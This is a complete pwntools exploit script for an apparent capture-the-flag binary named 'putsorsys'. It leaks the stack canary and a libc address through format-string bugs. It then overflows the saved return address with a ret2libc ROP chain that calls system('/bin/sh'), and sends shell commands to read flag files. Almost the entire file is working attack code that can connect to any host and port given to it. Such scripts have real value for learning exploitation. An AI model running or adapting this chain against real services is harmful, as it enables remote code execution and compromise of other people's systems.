from pwn import *
import os
import re
import ssl
import time

context.arch = "amd64"
context.log_level = "info"

BIN = "./putsorsys"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
LIBC_PATH = os.getenv("LIBC", "./libc.so.6")
LD_SO = os.getenv("LD_SO", "")
LIBC_DIR = os.getenv("LIBC_DIR", ".")

# Binary addresses (No PIE).
PUTS_GOT = 0x404018
BIN_SH = 0x40205E        # embedded "/bin/sh"

# main: char buf[0x30] @ rbp-0x30; canary @ rbp-0x8; saved RIP @ rbp+8
OFFSET = 0x28

# Gadgets in the bundled Ubuntu glibc 2.35 libc.
POP_RDI_OFF = 0x2A3E5
RET_OFF = 0x29CD6


def start():
    if args.LOCAL:
        if LD_SO:
            return process([LD_SO, "--library-path", LIBC_DIR, BIN])
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 13_putsorsys_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def menu(p, choice):
    p.recvuntil(b"Give me some gift?(0/1)\n")
    p.sendline(str(choice).encode())


def gift(p, data):
    p.recvuntil(b"What's it\n")
    p.send(data)
    p.recvuntil(b"Oh thanks,There is my gift:\n")


def exploit():
    p = start()
    libc = ELF(LIBC_PATH, checksec=False)

    # Round 1: canary is the 13th printf argument.
    menu(p, 1)
    gift(p, b"%13$p")
    line = p.recvuntil(b"/bin/sh\n")[: -len(b"/bin/sh\n")]
    canary = int(line, 16)
    log.success(f"canary = {canary:#x}")

    # Round 2: %9$s reads the 9th argument as a pointer. The short format
    # string leaves the following 8 bytes as the pointer: puts@GOT.
    menu(p, 1)
    fmt = b"%9$s\x00".ljust(8, b"\x00") + p64(PUTS_GOT)
    gift(p, fmt)
    raw = p.recvuntil(b"/bin/sh\n")[: -len(b"/bin/sh\n")]
    puts_leak = u64(raw.ljust(8, b"\x00"))
    libc_base = puts_leak - libc.symbols["puts"]
    if libc_base & 0xFFF:
        raise SystemExit(
            f"[-] libc base {libc_base:#x} is not page aligned; "
            "LIBC does not match the target"
        )
    system = libc_base + libc.symbols["system"]
    pop_rdi = libc_base + POP_RDI_OFF
    ret = libc_base + RET_OFF
    log.success(
        f"puts = {puts_leak:#x}, libc = {libc_base:#x}, system = {system:#x}"
    )

    # Round 3: preserve the canary, overflow saved RIP, then choose 0 to
    # leave the menu loop and return into the ROP chain.
    menu(p, 1)
    payload = flat(
        b"A" * OFFSET,
        canary,
        b"B" * 8,
        ret, pop_rdi, BIN_SH, system,
    )
    gift(p, payload)
    menu(p, 0)

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
